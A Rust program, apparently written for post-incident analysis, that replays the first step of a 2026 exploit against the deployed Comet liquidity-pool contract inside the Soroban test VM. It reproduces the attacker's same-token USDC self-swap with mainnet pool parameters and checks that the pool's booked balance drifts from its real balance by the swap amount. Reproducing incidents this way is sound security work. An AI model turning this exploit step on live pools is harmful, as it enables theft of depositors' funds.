//! Replays the first step of the 2026-08-25 Comet exploit (tx 41c898a1…) on the
//! DEPLOYED Comet wasm (8abc2891…) in the Soroban test VM: a pool initialised
//! with the mainnet BLND/USDC pool's state just before the transaction (books,
//! weights, swap fee), then the attacker's USDC -> USDC swap.
//!   cargo run --release --offline --bin comet_replay -- <comet.wasm>
use soroban_sdk::testutils::Address as _;
use soroban_sdk::token::{StellarAssetClient, TokenClient};
use soroban_sdk::{vec, Address, Env, IntoVal, Symbol, Val};

// mainnet, from the transaction's ledger changes and the pool's instance storage
const BOOK_USDC: i128 = 7_782_309_517_250;
const BOOK_BLND: i128 = 738_813_768_735_538;
const W_USDC: i128 = 2_000_000;
const W_BLND: i128 = 8_000_000;
const SWAP_FEE: i128 = 30_000;
const AMT_IN: i128 = 2_594_103_172_416;
const AMT_OUT_ONCHAIN: i128 = 1_941_196_544_582;

fn main() {
    let path = std::env::args().nth(1).expect("usage: comet_replay <comet.wasm>");
    let wasm = std::fs::read(path).expect("read wasm");
    let env = Env::default();
    env.mock_all_auths();
    env.cost_estimate().budget().reset_unlimited();
    let admin = Address::generate(&env);
    let blnd = env.register_stellar_asset_contract_v2(admin.clone()).address();
    let usdc = env.register_stellar_asset_contract_v2(admin.clone()).address();
    let controller = Address::generate(&env);
    let atk = Address::generate(&env);
    StellarAssetClient::new(&env, &blnd).mint(&controller, &BOOK_BLND);
    StellarAssetClient::new(&env, &usdc).mint(&controller, &BOOK_USDC);
    StellarAssetClient::new(&env, &usdc).mint(&atk, &AMT_IN);

    let pool = env.register(wasm.as_slice(), ());
    let call = |f: &str, args: soroban_sdk::Vec<Val>| -> Val { env.invoke_contract(&pool, &Symbol::new(&env, f), args) };
    call("init", vec![&env,
        controller.into_val(&env),
        vec![&env, blnd.clone(), usdc.clone()].into_val(&env),
        vec![&env, W_BLND, W_USDC].into_val(&env),
        vec![&env, BOOK_BLND, BOOK_USDC].into_val(&env),
        SWAP_FEE.into_val(&env)]);

    let book = |t: &Address| -> i128 {
        let v: Val = call("get_balance", vec![&env, t.into_val(&env)]);
        soroban_sdk::TryFromVal::try_from_val(&env, &v).unwrap()
    };
    let real = |t: &Address| TokenClient::new(&env, t).balance(&pool);
    let (b0, r0) = (book(&usdc), real(&usdc));

    let out: (i128, i128) = soroban_sdk::TryFromVal::try_from_val(&env, &call("swap_exact_amount_in", vec![&env,
        usdc.into_val(&env), AMT_IN.into_val(&env), usdc.into_val(&env),
        0i128.into_val(&env), i128::MAX.into_val(&env), atk.into_val(&env)])).unwrap();
    let (b1, r1) = (book(&usdc), real(&usdc));

    println!("USDC book before {b0}, real before {r0}");
    println!("self-swap {AMT_IN} USDC -> {} USDC (on chain: {AMT_OUT_ONCHAIN})", out.0);
    println!("USDC book after  {b1} (delta {}), real after {r1} (delta {})", b1 - b0, r1 - r0);
    println!("unbooked: {}", (r1 - r0) - (b1 - b0));
    assert_eq!(out.0, AMT_OUT_ONCHAIN, "replay diverges from chain");
    assert_eq!((r1 - r0) - (b1 - b0), AMT_IN, "drift is not exactly amount_in");
    println!("REPLAY ok: matches the chain; the book drifts by exactly token_amount_in");
}
